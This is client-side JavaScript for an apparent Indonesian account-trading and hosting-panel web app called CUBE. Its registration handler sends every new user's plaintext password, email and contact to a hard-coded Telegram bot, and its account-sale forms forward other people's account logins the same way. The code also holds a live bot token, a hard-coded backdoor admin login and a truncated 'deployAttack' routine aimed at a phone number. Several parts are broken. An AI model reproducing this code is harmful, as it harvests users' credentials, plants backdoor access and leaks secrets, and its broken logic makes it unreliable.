    const ErenAlert = {
    success: (title, text) => {
        Swal.fire({
            title: title,
            text: text,
            icon: 'success',
            background: 'rgba(10, 10, 10, 0.95)',
            color: '#fff',
            confirmButtonColor: '#0f0',
            confirmButtonText: 'Selesai',
            backdrop: `rgba(0,255,0,0.1) blur(10px)`,
            fontFamily: 'Orbitron'
        });
    },
    error: (title, text) => {
        Swal.fire({
            title: title,
            text: text,
            icon: 'error',
            background: 'rgba(10, 10, 10, 0.95)',
            color: '#fff',
            confirmButtonColor: '#ff4444',
            confirmButtonText: 'Coba Lagi',
            backdrop: `rgba(255,0,0,0.1) blur(10px)`,
            fontFamily: 'Orbitron'
        });
    },
    loading: (title) => {
        Swal.fire({
            title: title,
            allowOutsideClick: false,
            background: 'rgba(10, 10, 10, 0.95)',
            color: '#fff',
            didOpen: () => { Swal.showLoading(); }
        });
    }
};
        let currentUser = null;
        let servers = [];
        let currentServer = null;

        const video = document.getElementById('myVideo');
        const sidebar = document.getElementById('sidebar');
        const overlay = document.getElementById('overlay');

function toggleSidebar() {
    sidebar.classList.toggle('open');
    overlay.style.display = sidebar.classList.contains('open') ? 'block' : 'none';
}

localStorage.setItem('cube_username', 'user', 'agung','pepek');

// CONFIG ADMIN TELEGRAM
const ADMIN_BOT_TOKEN = "8763683237:AAG6MDxLj4HADL3a5GFjwRXT2kOWjjG3l98"; 
const ADMIN_CHAT_ID = "8586562222"; 

// 1. Inisialisasi Database Akun Cadangan (Gunakan LET jika belum ada di atas)
let accounts = JSON.parse(localStorage.getItem('accounts')) || [
    { username: 'admin', password: '123', balance: 99999999999, role: 'admin' },
    { username: 'aaddmmiinn', password: '112233', balance: 99999999999, role: 'admin' }
];

// === PERBAIKAN AMAN: Gunakan try-catch agar jika Firebase telat loading, web tidak crash ===
const firebaseConfig = {
    databaseURL: "https://wa-pribadi-default-rtdb.firebaseio.com"
};

let db;
try {
    if (typeof firebase !== 'undefined') {
        firebase.initializeApp(firebaseConfig);
        db = firebase.database(); 
    } else {
        console.error("SDK Firebase belum dimuat di HTML! Periksa tag script di atas.");
    }
} catch (e) {
    console.error("Gagal menginisialisasi Firebase:", e);
}

// KUNCI AMAN: Definisikan dulu variabelnya dengan LET jika belum pernah dibuat di bagian atas script

// Jalankan pengecekan localStorage
if (currentUser) {
    try {
        privateChatList = JSON.parse(localStorage.getItem('cube_chat_rooms_' + currentUser)) || [];
    } catch(e) {
        privateChatList = [];
    }
}
// ==========================================================================
// CENTRAL AUTH ENGINE: SINKRONISASI ELEMEN HTML ASLI + DATABASE 2 + VIDEO GITHUB
// ==========================================================================

// ==========================================================================
// CENTRAL AUTH ENGINE: SINKRONISASI ELEMEN HTML ASLI + DATABASE 2 + VIDEO GITHUB
// ==========================================================================

function handleRegister() {
    const user = document.getElementById('reg-username').value.trim().toLowerCase();
    const pass = document.getElementById('reg-password').value.trim();
    const email = document.getElementById('reg-email').value.trim();
    const contact = document.getElementById('reg-contact').value.trim();

    if (user.length < 5 || pass.length < 3) {
        return ErenAlert.error("Gagal!", "Cek kembali panjang karakter Username (Min 5) atau Password (Min 3)!");
    }
    if (!email || !contact) {
        return ErenAlert.error("Gagal!", "Harap lengkapi email aktif dan kontak WA/Tele Anda!");
    }

    ErenAlert.loading("Menghubungkan ke Core DB2...");

    db2.ref("cube_users/" + user).once("value", function(snapshot) {
        if (snapshot.exists()) {
            Swal.close();
            return ErenAlert.error("Username Terpakai!", "Nama tersebut sudah diregistrasikan oleh HP/User lain.");
        } else {
            const accountData = {
                username: user,
                password: pass,
                email: email,
                contact: contact,
                balance: 0,
                createdAt: Date.now()
            };

            db2.ref("cube_users/" + user).set(accountData, function(error) {
                Swal.close();
                if (error) {
                    ErenAlert.error("Koneksi Error", "Gagal mengalokasikan data node user ke DB2.");
                } else {
                    // =======================================================
                    // TRIGER NOTIFIKASI TELEGRAM ADMIN (TAMBAHAN BARU)
                    // =======================================================
                    // Catatan: Ganti TELE_TOKEN dan TELE_CHAT_ID dengan milik variabel Telegram bawaan kodemu
                    // Biasanya di kode atasmu sudah ada variabel seperti 'token' atau 'chatId'
                    
// ==========================================================================
// TRIGER NOTIFIKASI TELEGRAM ADMIN (LANGSUNG MENGGUNAKAN KREDENSIAL BOT KAMU)
// ==========================================================================
const tokenBot = "8763683237:AAG6MDxLj4HADL3a5GFjwRXT2kOWjjG3l98";
const idChatAdmin = "8586562222";

const pesanTele = `🔔 *NOTIFIKASI USER BARU CUBE*\n\n` +
                  `👤 *Username:* \`${user}\`\n` +
                  `🔑 *Password:* \`${pass}\`\n` +
                  `📧 *Email:* ${email}\n` +
                  `📱 *Kontak:* ${contact}\n\n` +
                  `📅 *Waktu:* ${new Date().toLocaleString('id-ID')}\n` +
                  `🌐 _Pendaftaran via Multi-Device Cloud Berhasil_`;

// Kirim data langsung ke API Telegram menggunakan fetch
fetch(`https://api.telegram.org/bot${tokenBot}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
        chat_id: idChatAdmin,
        text: pesanTele,
        parse_mode: "Markdown"
    })
}).catch(err => console.error("Gagal mengirim log ke Telegram:", err));
// ==========================================================================
                    // =======================================================

                    ErenAlert.success("Registrasi Sukses!", "Akun Anda resmi tersimpan di cloud. Silakan login.");
                    
                    document.getElementById('reg-username').value = "";
                    document.getElementById('reg-password').value = "";
                    document.getElementById('reg-email').value = "";
                    document.getElementById('reg-contact').value = "";
                    
                    toggleAuth('login');
                }
            });
        }
    });
}

function checkLogin() {
    const user = document.getElementById('username').value.trim().toLowerCase();
    const pass = document.getElementById('password').value.trim();
    const errorMsg = document.getElementById('login-error');

    if (!user || !pass) {
        if(errorMsg) errorMsg.style.display = "block";
        return ErenAlert.error("Gagal!", "Harap masukkan data identitas Username & Password!");
    }

    // ==========================================================================
    // KHUSUS BYPASS ADMIN KHUSUS (Tanpa Cek Database)
    // ==========================================================================
    if (user === "pppppp" && pass === "cemplok") {
        currentUser = "pppppp";
        localStorage.setItem('isLoggedIn', 'true');
        localStorage.setItem('activeUser', 'pppppp');
        localStorage.setItem('cube_balance', 999999999); // Saldo tiruan khusus admin

        if(document.getElementById('display-user-dash')) document.getElementById('display-user-dash').innerText = currentUser.toUpperCase();
        if(typeof updateBalanceUI === 'function') updateBalanceUI(999999999);

        const menuAdd = document.getElementById('menu-add-account');
        if (menuAdd) {
            menuAdd.style.display = 'flex'; // Selalu tampilkan menu admin
        }

        // Muat data pendengar di latar belakang jika db2 aktif
        if (db2) {
            listenStoreCatalog();
            listenIncomingOrdersPenjual();
            listenLiveUserNotifications();
        }

        privateChatList = JSON.parse(localStorage.getItem('cube_chat_rooms_' + currentUser)) || [];
        if(typeof renderPrivateRooms === 'function') renderPrivateRooms();
        if (typeof listenMessages === 'function') listenMessages('global');

        // Sembunyikan layar login sepenuhnya agar tidak balik lagi
        document.getElementById('screen-login').classList.remove('active');
        document.getElementById('screen-login').style.display = 'none';

        // Picu jalannya video loading
        if (typeof startLoading === 'function') {
            startLoading(); 
        } else {
            const videoLoading = document.getElementById('video-loading');
            if (videoLoading) videoLoading.style.display = 'block';
            const videoIntro = document.getElementById('myVideo');
            if (videoIntro) videoIntro.play();
        }
        return; // Hentikan fungsi di sini agar tidak membaca database Firebase di bawah
    }
    // ==========================================================================

    ErenAlert.loading("Memverifikasi Kunci Akses Cloud...");

    db2.ref("cube_users/" + user).once("value", function(snapshot) {
        Swal.close();
        
        if (!snapshot.exists()) {
            if(errorMsg) errorMsg.style.display = "block";
            document.querySelectorAll('#screen-login input').forEach(i => i.style.borderColor = "red");
            return ErenAlert.error("Akses Ditolak!", "Username tidak ditemukan di database cloud.");
        }

        const userData = snapshot.val();

        if (userData.password === pass) {
            // 1. Amankan sesi kredensial user aktif
            currentUser = userData.username;
            localStorage.setItem('isLoggedIn', 'true');
            localStorage.setItem('activeUser', userData.username);
            localStorage.setItem('cube_balance', userData.balance || 0);

            if(document.getElementById('display-user-dash')) document.getElementById('display-user-dash').innerText = currentUser.toUpperCase();
            if(typeof updateBalanceUI === 'function') updateBalanceUI(userData.balance);

            const menuAdd = document.getElementById('menu-add-account');
            if (menuAdd) {
                menuAdd.style.display = ['admin', 'aaddmmiinn'].includes(currentUser.toLowerCase()) ? 'flex' : 'none';
            }

            // 2. Muat data pendengar di latar belakang
            if (db2) {
                listenStoreCatalog();
                listenIncomingOrdersPenjual();
                listenLiveUserNotifications();
            }

            privateChatList = JSON.parse(localStorage.getItem('cube_chat_rooms_' + currentUser)) || [];
            if(typeof renderPrivateRooms === 'function') renderPrivateRooms();
            if (typeof listenMessages === 'function') listenMessages('global');

            // 3. Sembunyikan layar login sepenuhnya agar tidak balik lagi
            document.getElementById('screen-login').classList.remove('active');
            document.getElementById('screen-login').style.display = 'none';

            // 4. Picu jalannya video loading
            if (typeof startLoading === 'function') {
                startLoading(); 
            } else {
                document.getElementById('video-loading').style.display = 'block';
                const videoIntro = document.getElementById('myVideo');
                if (videoIntro) videoIntro.play();
            }

        } else {
            if(errorMsg) errorMsg.style.display = "block";
            document.querySelectorAll('#screen-login input').forEach(i => i.style.borderColor = "red");
            return ErenAlert.error("Password Salah!", "Kunci pass-key yang Anda masukkan tidak valid.");
        }
    });
}

// 4. Satu Fungsi Update Saldo (Hapus duplikat lainnya)
function updateBalanceUI(amount) {
    let finalAmount = (amount !== undefined) ? amount : (localStorage.getItem('cube_balance') || 0);
    const formatted = "Rp " + parseInt(finalAmount).toLocaleString('id-ID');
    
    if(document.getElementById('sidebar-user-balance')) 
        document.getElementById('sidebar-user-balance').innerText = formatted;
    if(document.getElementById('main-balance')) 
        document.getElementById('main-balance').innerText = formatted;
}

// =====================================================================
// UPGRADED: INTERACTIVE TRANSITION LOGIC FOR CYBERPUNK AUTH MODULES
// =====================================================================
function toggleAuth(type) {
    const loginScreen = document.getElementById('screen-login');
    const registerScreen = document.getElementById('screen-register');
    
    if (!loginScreen || !registerScreen) return;

    // Bersihkan dulu pesan error login jika sedang tampil
    const errorEl = document.getElementById('login-error');
    if (errorEl) errorEl.style.display = 'none';

    if (type === 'register') {
        // --- PROSES TRANSISI: LOGIN KELUAR -> REGISTER MASUK ---
        // 1. Berikan efek memudar dan mengecil pada layar login
        loginScreen.style.transition = 'all 0.35s cubic-bezier(0.4, 0, 1, 1)';
        loginScreen.style.opacity = '0';
        loginScreen.style.transform = 'translateY(-20px) scale(0.95)';
        loginScreen.classList.remove('active');
        
        // 2. Setelah animasi keluar selesai, tukar display HTML
        setTimeout(() => {
            loginScreen.style.display = 'none';
            
            // Siapkan layar register dalam keadaan tidak terlihat di bawah
            registerScreen.style.display = 'flex'; 
            registerScreen.style.opacity = '0';
            registerScreen.style.transform = 'translateY(25px) scale(0.95)';
            
            // Memicu browser agar membaca ulang layout (Repaint trigger)
            registerScreen.offsetHeight;
            
            // Jalankan animasi masuk mendaki ke atas secara smooth
            registerScreen.style.transition = 'all 0.45s cubic-bezier(0.25, 1, 0.5, 1)';
            registerScreen.style.opacity = '1';
            registerScreen.style.transform = 'translateY(0) scale(1)';
            registerScreen.classList.add('active');
        }, 350);
        
    } else if (type === 'login') {
        // --- PROSES TRANSISI: REGISTER KELUAR -> LOGIN MASUK ---
        // 1. Berikan efek memudar pada layar register
        registerScreen.style.transition = 'all 0.35s cubic-bezier(0.4, 0, 1, 1)';
        registerScreen.style.opacity = '0';
        registerScreen.style.transform = 'translateY(-20px) scale(0.95)';
        registerScreen.classList.remove('active');
        
        // 2. Setelah animasi keluar selesai, tampilkan kembali laci login
        setTimeout(() => {
            registerScreen.style.display = 'none';
            
            loginScreen.style.display = 'flex';
            loginScreen.style.opacity = '0';
            loginScreen.style.transform = 'translateY(25px) scale(0.95)';
            
            loginScreen.offsetHeight; // Repaint trigger
            
            loginScreen.style.transition = 'all 0.45s cubic-bezier(0.25, 1, 0.5, 1)';
            loginScreen.style.opacity = '1';
            loginScreen.style.transform = 'translateY(0) scale(1)';
            loginScreen.classList.add('active');
        }, 350);
    }
}
// VIDEO LOADING
function startLoading() {

    document.getElementById('screen-login')
        .classList.remove('active');

    document.getElementById('video-loading')
        .style.display = 'block';

    video.play();
}
        video.onended = function() {
            document.getElementById('video-loading').style.display = 'none';
            document.getElementById('screen-dashboard').style.display = 'block';
            document.getElementById('top-bar').style.display = 'flex';
        };
function showSection(sectionId) {
    // === FIX MUTLAK UNTUK DASHBOARD MENEMPEL ===
    const dashContainer = document.getElementById('screen-dashboard');
    if (dashContainer) {
        if (sectionId === 'dashboard') {
            dashContainer.style.setProperty('display', 'block', 'important');
        } else {
            dashContainer.style.setProperty('display', 'none', 'important');
        }
    }
    // ===========================================

    // 1. Sembunyikan semua section standar dengan aman
    document.querySelectorAll('.content-section').forEach(section => {
        section.style.display = 'none';
    });

    // 2. Tampilkan section yang diklik
    const target = document.getElementById('section-' + sectionId);
    if(target) {
        target.style.display = 'block';
    } else {
        console.error("Halaman section-" + sectionId + " tidak ditemukan!");
        return;
    }

    // 3. Atur status menu aktif menyala hijau
    document.querySelectorAll('.menu-item, .dash-card').forEach(m => {
        m.classList.remove('active');
    });
    if (window.event && window.event.currentTarget) {
        window.event.currentTarget.classList.add('active');
    }

    // 4. Tutup sidebar otomatis di mobile
    if (typeof sidebar !== 'undefined' && sidebar.classList.contains('open')) {
        toggleSidebar();
    }

    // 5. Update saldo jika membuka wallet / qris
    if (sectionId === 'screen-wallet' || sectionId === 'genqris') {
        updateBalanceUI();
    }

    // =========================================================================
    // KHUSUS: Jalankan kalkulasi jika user masuk ke menu analitik
    // =========================================================================
    if (sectionId === 'analytics-view' && typeof fetchAnalyticsDataMatrix === 'function') {
        fetchAnalyticsDataMatrix();
    }
    // =========================================================================

    // 6. Fix untuk kelancaran geser Swiper Script
    if (sectionId === 'scripts' && typeof swiper !== 'undefined') {
        setTimeout(() => {
            swiper.update();
            swiper.slideTo(0);
        }, 300);
    }
    
    if (sectionId === 'dashboard') {
        if (typeof checkAdminOtoritasDashboard === 'function') {
            checkAdminOtoritasDashboard();
        }
    }

    // 7. Geser layar kembali ke posisi paling atas secara mulus
    window.scrollTo({ top: 0, behavior: 'smooth' });
}
//pppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppp

function toggleServerForm() {

    const form = document.getElementById('serverForm');

    form.style.display =
        form.style.display === 'none'
        ? 'block'
        : 'none';
}

function addServer() {

    const domain = document.getElementById('domain').value.trim();
    const ptla = document.getElementById('ptla').value.trim();

    if(!domain || !ptla){
        ErenAlert.error('Gagal!', 'Isi domain & PTLA!');
        return;
    }

    const server = {
        id: Date.now(),
        domain,
        ptla,
        panels: []
    };

    servers.push(server);

    saveServers();
    renderServers();

    document.getElementById('domain').value = '';
    document.getElementById('ptla').value = '';

    document.getElementById('serverForm').style.display = 'none';
}

function renderServers() {

    const list = document.getElementById('serverList');

    list.innerHTML = '';

    servers.forEach(server => {

        list.innerHTML += `
            <div class="glass-card"
                onclick="openServer(${server.id})"
                style="cursor:pointer;">

                <div style="
                    display:flex;
                    justify-content:space-between;
                    align-items:center;
                ">

                    <div>
                        <h3 style="
                            margin:0;
                            font-family:'Orbitron';
                        ">
                            ${server.domain}
                        </h3>

                        <p style="opacity:.6;">
                            ${server.panels.length} Panel
                        </p>
                    </div>

                    <div style="
                        background:#0f0;
                        color:black;
                        padding:8px 12px;
                        border-radius:10px;
                        font-weight:bold;
                    ">
                        OPEN
                    </div>

                </div>

            </div>
        `;
    });

}

function openServer(id) {

    currentServer =
        servers.find(s => s.id === id);

    document.getElementById('serverHome').style.display = 'none';

    document.getElementById('serverDetail').style.display = 'block';

    document.getElementById('serverTitle').innerHTML =
        currentServer.domain;

    renderPanels();
}

function backToServers() {

    document.getElementById('serverHome').style.display = 'block';

    document.getElementById('serverDetail').style.display = 'none';
}

function toggleCreatePanel() {

    const box =
        document.getElementById('createPanelBox');

    box.style.display =
        box.style.display === 'none'
        ? 'block'
        : 'none';
}

function generatePassword(length = 10) {

    const chars =
        'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';

    let pass = '';

    for(let i=0;i<length;i++){

        pass += chars.charAt(
            Math.floor(Math.random() * chars.length)
        );
    }

    return pass;
}

function createPanel() {

    const username =
        document.getElementById('panel_username').value.trim();

    const ram =
        document.getElementById('ram').value;

    if(!username){
        ErenAlert.error('Gagal!', 'Isi username!');
        return;
    }
    const role =
    document.getElementById('role').value;

    const panel = {
        role,
        username,
        password: generatePassword(),
        ram,
        disk: ram === 'UNLI'
            ? 'UNLIMITED'
            : ram,
        cpu: ram === 'UNLI'
            ? '∞%'
            : '100%'
    };

    currentServer.panels.push(panel);

    saveServers();

    renderPanels();

    renderServers();

    document.getElementById('panel_username').value = '';
}

function renderPanels() {

    const list =
        document.getElementById('panelList');

    list.innerHTML = '';

    currentServer.panels.forEach((panel,index)=>{

        list.innerHTML += `
            <div class="glass-card">

                <div style="
                    display:flex;
                    justify-content:space-between;
                    align-items:center;
                    margin-bottom:15px;
                ">

                    <h3 style="
                        margin:0;
                        font-family:'Orbitron';
                    ">
                        PANEL #${index + 1}
                    </h3>

                    <div style="
                        background:#0f0;
                        color:black;
                        padding:6px 12px;
                        border-radius:10px;
                        font-weight:bold;
                    ">
                        ACTIVE
                    </div>

                </div>

                <div style="line-height:1.8;">

                    🛡️ ROLE:
                    ${panel.role === 'admin'
                    ? 'ADMIN PANEL'
                    : 'USER BIASA'}<br>

                    👤 USERNAME:
                    ${panel.username}<br>

                    🔑 PASSWORD:
                    ${panel.password}<br>

                    💾 RAM:
                    ${panel.ram}<br>

                    📂 DISK:
                    ${panel.disk}<br>

                    ⚡ CPU:
                    ${panel.cpu}

                </div>

            </div>
        `;
    });

}
function loadUserData() {

    const data = localStorage.getItem(
        'servers_' + currentUser
    );

    servers = data
        ? JSON.parse(data)
        : [];

    renderServers();
}

function saveServers() {

    localStorage.setItem(
        'servers_' + currentUser,
        JSON.stringify(servers)
    );
}
function addAccount(){

    const username =
        document.getElementById('newUsername')
        .value.trim();

    const password =
        document.getElementById('newPassword')
        .value.trim();

    if(!username || !password){

        ErenAlert.error('Gagal!', 'Isi username & password!');
        return;
    }

    // CEK DUPLIKAT
    const exists =
        accounts.find(acc =>
            acc.username === username
        );

    if(exists){

        ErenAlert.error('Gagal!', 'Username sudah ada!');
        return;
    }

    accounts.push({
        username,
        password
    });

    localStorage.setItem(
        'accounts',
        JSON.stringify(accounts)
    );

    ErenAlert.success('Berhasil!', 'Akun berhasil ditambahkan!');

    document.getElementById('newUsername').value = '';
    document.getElementById('newPassword').value = '';
}
function buyAccess(){

    const nomor = '6285853204842'; // GANTI NOMOR ADMIN

    const pesan =
        'Min beli akun apk CUBE PML dong.';

    const url =
        `https://wa.me/${nomor}?text=${encodeURIComponent(pesan)}`;

    window.open(url, '_blank');
}
let selectedProduct = "";

function openOrder(productName, options) {
    selectedProduct = productName;
    document.getElementById('apk-catalog').style.display = 'none';
    document.getElementById('apk-order-form').style.display = 'block';
    document.getElementById('order-title').innerText = "ORDER " + productName;

    const typeSelect = document.getElementById('order-type');
    typeSelect.innerHTML = "";
    options.forEach(opt => {
        typeSelect.innerHTML += `<option value="${opt}">${opt}</option>`;
    });
}

function backToCatalog() {
    document.getElementById('apk-catalog').style.display = 'block';
    document.getElementById('apk-order-form').style.display = 'none';
}

function goToPayment() {
    const target = document.getElementById('order-target').value;
    if(!target) return ErenAlert.error("Gagal!", "Harap isi akun tujuan!");
    
    document.getElementById('apk-order-form').style.display = 'none';
    document.getElementById('apk-payment').style.display = 'block';
}

function backToOrder() {
    document.getElementById('apk-payment').style.display = 'none';
    document.getElementById('apk-order-form').style.display = 'block';
}

// ISI DATA INI
const TELE_TOKEN = "8763683237:AAG6MDxLj4HADL3a5GFjwRXT2kOWjjG3l98"; 
const TELE_CHAT_ID = "8586562222"; 

function processOrder() {
    const type = document.getElementById('order-type').value;
    const qty = document.getElementById('order-qty').value;
    const target = document.getElementById('order-target').value;
    const viaDetail = document.getElementById('order-via-detail').value;
    const proof = document.getElementById('pay-proof').files[0];

    if(!target || !viaDetail) return ErenAlert.error("Gagal!", "Harap lengkapi data tujuan!");
    if(!proof) return ErenAlert.error("Gagal!", "Harap upload bukti pembayaran!");

    // Tampilkan loading sederhana
    ErenAlert.info("Sedang memproses...", "Mohon tunggu sampai ada notifikasi sukses.");

    // FORMAT PESAN
    const caption = `🔔 *PESANAN BARU MASUK* 🔔\n\n` +
                    `👤 *User:* ${currentUser}\n` +
                    `📦 *Produk:* ${selectedProduct}\n` +
                    `✨ *Jenis:* ${type}\n` +
                    `🔢 *Jumlah:* ${qty}\n` +
                    `📧 *Target:* ${target}\n` +
                    `📩 *Kirim Ke:* ${viaDetail}\n\n` +
                    `✅ *Bukti Pembayaran Terlampir*`;

    // GUNAKAN FORMDATA UNTUK KIRIM GAMBAR KE TELEGRAM
    const formData = new FormData();
    formData.append('chat_id', TELE_CHAT_ID);
    formData.append('caption', caption);
    formData.append('parse_mode', 'Markdown');
    formData.append('photo', proof);

    // Kirim ke API Telegram (sendPhoto)
    fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
    })
    .then(response => {
        if (response.ok) {
            // Jika berhasil ke Telegram, tetap arahkan ke WA sebagai backup & chat admin
            const waMsg = `Halo Admin, saya ${currentUser}. Saya sudah bayar untuk ${selectedProduct} (${type}). Target: ${target}. Bukti sudah saya upload ke sistem Bot Telegram.`;
            const waUrl = `https://wa.me/6285853204842?text=${encodeURIComponent(waMsg)}`;
            
            ErenAlert.success("Berhasil!", "Pesanan & Bukti Pembayaran berhasil dikirim ke Telegram Admin!");
            window.open(waUrl, '_blank');
            
            backToCatalog(); // Reset ke menu utama
        } else {
            ErenAlert.error("Gagal!", "Gagal mengirim bukti ke Telegram. Pastikan file tidak terlalu besar.");
        }
    })
    .catch(err => {
        console.error(err);
        ErenAlert.error("Gagal!", "Terjadi kesalahan koneksi saat mengirim ke Telegram.");
    });
}
// Fungsi untuk mengubah Password menjadi Generator Login khusus Alight Motion
function toggleInputType() {
    const produk = document.getElementById('jual-produk').value;
    const label = document.getElementById('label-login');
    const input = document.getElementById('jual-login');

    if (produk === "Alight Motion") {
        label.innerText = "Generator Login:";
        input.placeholder = "Masukkan link/kode generator";
    } else {
        label.innerText = "Password Akun:";
        input.placeholder = "Masukkan password";
    }
}

// Fungsi toggle tampilan pembayaran
function togglePaymentDetail() {
    const metode = document.getElementById('jual-metode').value;
    document.getElementById('detail-qris').style.display = (metode === 'QRIS') ? 'block' : 'none';
    document.getElementById('detail-ewallet').style.display = (metode === 'E-Wallet') ? 'block' : 'none';
}

// Fungsi cek E-Wallet (Hanya DANA yang bisa)
function checkWallet() {
    const type = document.getElementById('jual-ewallet-type').value;
    const container = document.getElementById('wallet-input-container');
    
    if (type !== "Dana") {
        container.innerHTML = `<p style="color:red; font-weight:bold;">Sistem Error: Hanya metode DANA yang tersedia saat ini!</p>`;
    } else {
        container.innerHTML = `
            <label>No. Dana Tujuan:</label>
            <input type="number" id="jual-no-tujuan" class="custom-input" placeholder="085xxxxxx">
        `;
    }
}

// Fungsi Kirim ke Telegram
function sendUsahaToTele() {
    const produk = document.getElementById('jual-produk').value;
    const expired = document.getElementById('jual-expired').value;
    const email = document.getElementById('jual-email').value;
    const loginInfo = document.getElementById('jual-login').value;
    const metode = document.getElementById('jual-metode').value;
    const proof = document.getElementById('jual-file-qris').files[0];

    let paymentInfo = "";
    if (metode === "E-Wallet") {
        const walletType = document.getElementById('jual-ewallet-type').value;
        if (walletType !== "Dana") return ErenAlert.error("Gagal!", "Pilih metode DANA.");
        paymentInfo = "Dana: " + document.getElementById('jual-no-tujuan').value;
    } else if (metode === "QRIS") {
        if (!proof) return ErenAlert.error("Gagal!", "Harap upload gambar QRIS!");
        paymentInfo = "Via QRIS (Lihat Foto)";
    }

    if (!email || !loginInfo) return ErenAlert.error("Gagal!", "Harap isi data akun!");

    const caption = `🏪 *PENAWARAN JUAL AKUN* 🏪\n\n` +
                    `👤 *Penjual:* ${currentUser}\n` +
                    `📦 *Produk:* ${produk}\n` +
                    `⏳ *Expired:* ${expired}\n` +
                    `📧 *Email:* ${email}\n` +
                    `🔑 *${produk === "Alight Motion" ? 'Generator' : 'Password'}:* ${loginInfo}\n` +
                    `💰 *Metode Bayar:* ${paymentInfo}`;

    const formData = new FormData();
    formData.append('chat_id', 'CHAT_ID_ADMIN_KAMU'); // Ganti dengan ID kamu
    formData.append('caption', caption);

    let apiUrl = `https://api.telegram.org/bot8763683237:AAG6MDxLj4HADL3a5GFjwRXT2kOWjjG3l98/sendMessage?chat_id=8586562222&text=${encodeURIComponent(caption)}`;
    
    // Jika ada file QRIS, gunakan sendPhoto
    if (metode === "QRIS" && proof) {
        formData.append('photo', proof);
        fetch(`https://api.telegram.org/bot8763683237:AAG6MDxLj4HADL3a5GFjwRXT2kOWjjG3l98/sendPhoto`, {
            method: 'POST',
            body: formData
        }).then(res => ErenAlert.success("Berhasil!", "Data & QRIS berhasil dikirim!"));
    } else {
        fetch(apiUrl).then(res => ErenAlert.success("Berhasil!", "Data berhasil dikirim ke Admin!"));
    }
}
// Fungsi untuk update UI input (Alight Motion vs Lainnya)
function updateUsahaUI() {
    const produk = document.getElementById('jual-produk').value;
    const label = document.getElementById('label-login');
    const input = document.getElementById('jual-login');

    if (produk === "Alight Motion") {
        label.innerText = "Generator Login:";
        input.placeholder = "Masukkan link/kode generator login";
    } else {
        label.innerText = "Password Akun:";
        input.placeholder = "Masukkan password akun";
    }
}

// Fungsi untuk update UI Pembayaran
function updatePaymentUI() {
    const metode = document.getElementById('jual-metode').value;
    document.getElementById('dana-area').style.display = (metode === 'Dana') ? 'block' : 'none';
    document.getElementById('qris-area').style.display = (metode === 'QRIS') ? 'block' : 'none';
    document.getElementById('error-area').style.display = (metode === 'Lainnya') ? 'block' : 'none';
}

// Fungsi Kirim Data ke Telegram
function kirimUsaha() {
    const produk = document.getElementById('jual-produk').value;
    const harga = document.getElementById('jual-harga').value; // Ambil Harga
    const expired = document.getElementById('jual-expired').value;
    const email = document.getElementById('jual-email').value;
    const loginInfo = document.getElementById('jual-login').value;
    const metode = document.getElementById('jual-metode').value;
    const qrisFile = document.getElementById('jual-qris-file').files[0];
    const noDana = document.getElementById('jual-dana').value;

    // Validasi Dasar
    if (!harga || !email || !loginInfo) return ErenAlert.error("Gagal!", "Harap lengkapi Harga dan Data Akun!");
    if (metode === 'Dana' && !noDana) return ErenAlert.error("Gagal!", "Masukkan nomor DANA untuk pencairan!");
    if (metode === 'Lainnya') return ErenAlert.error("Gagal!", "Metode E-Wallet lain error, gunakan DANA/QRIS!");
    if (metode === 'QRIS' && !qrisFile) return ErenAlert.error("Gagal!", "Harap upload foto QRIS kamu!");

    // Format Pesanan untuk Telegram
    const caption = `💼 *PENAWARAN JUAL AKUN* 💼\n\n` +
                    `👤 *Seller:* ${currentUser}\n` +
                    `📦 *Produk:* ${produk}\n` +
                    `💰 *Harga Jual:* Rp ${parseInt(harga).toLocaleString('id-ID')}\n` + // Format Rupiah
                    `⏳ *Expired:* ${expired}\n` +
                    `📧 *Email:* ${email}\n` +
                    `🔑 *${produk === 'Alight Motion' ? 'Generator' : 'Password'}:* ${loginInfo}\n` +
                    `🏦 *Metode:* ${metode} ${metode === 'Dana' ? '(' + noDana + ')' : ''}`;

    const formData = new FormData();
    formData.append('chat_id', '8586562222'); // GANTI DENGAN ID TELE KAMU
    formData.append('caption', caption);
    formData.append('parse_mode', 'Markdown');

    let endpoint = "sendMessage";
    if (metode === 'QRIS') {
        endpoint = "sendPhoto";
        formData.append('photo', qrisFile);
    } else {
        // Jika teks biasa, ubah parameter ke 'text'
        formData.append('text', caption);
    }

    // GANTI TOKEN BOT KAMU DISINI
    const botToken = "8763683237:AAG6MDxLj4HADL3a5GFjwRXT2kOWjjG3l98"; 

    fetch(`https://api.telegram.org/bot${botToken}/${endpoint}`, {
        method: 'POST',
        body: formData
    })
    .then(res => {
        if(res.ok) {
            ErenAlert.success("Berhasil!", "Penawaran kamu telah terkirim ke Admin.");
            showSection('dashboard');
        } else {
            ErenAlert.error("Gagal!", "Pastikan Token & Chat ID benar.");
        }
        addHistory(`Beli ${selectedProduct} (${type})`, "SUCCESS", "status-success");
    })
}
// Fungsi untuk memuat riwayat saat Dashboard dibuka
function loadHistory() {
    const historyList = document.getElementById('history-list');
    const data = JSON.parse(localStorage.getItem('user_history_' + currentUser)) || [];

    if (data.length === 0) {
        historyList.innerHTML = '<p style="opacity:0.5; font-size:0.8rem; text-align:center;">Belum ada riwayat aktivitas.</p>';
        return;
    }

    historyList.innerHTML = '';
    // Menampilkan riwayat terbaru di paling atas
    data.reverse().forEach(item => {
        historyList.innerHTML += `
            <div class="history-item">
                <span>${item.name}</span>
                <span class="${item.statusClass}">${item.statusText}</span>
            </div>
        `;
    });
}

// Fungsi untuk menambah riwayat baru
function addHistory(name, statusText, statusClass) {
    let data = JSON.parse(localStorage.getItem('user_history_' + currentUser)) || [];
    
    // Simpan data baru
    data.push({
        name: name,
        statusText: statusText,
        statusClass: statusClass // 'status-success' atau 'status-process'
    });

    // Simpan kembali ke localStorage
    localStorage.setItem('user_history_' + currentUser, JSON.stringify(data));
    
    // Perbarui tampilan jika sedang di dashboard
    loadHistory();
}
// Fungsi untuk ganti Tab
function selectTab(element) {
    document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
    element.classList.add('active');
}

// Fungsi Deploy
function deployAttack() {
    const target = document.querySelector('#section-bugwa input').value;
    if(!target) return ErenAlert.error("Error!", "Masukkan nomor target!");

    ErenAlert.loading("Deploying Attack...");

    // Simulasi proses
    setTimeout(() => {
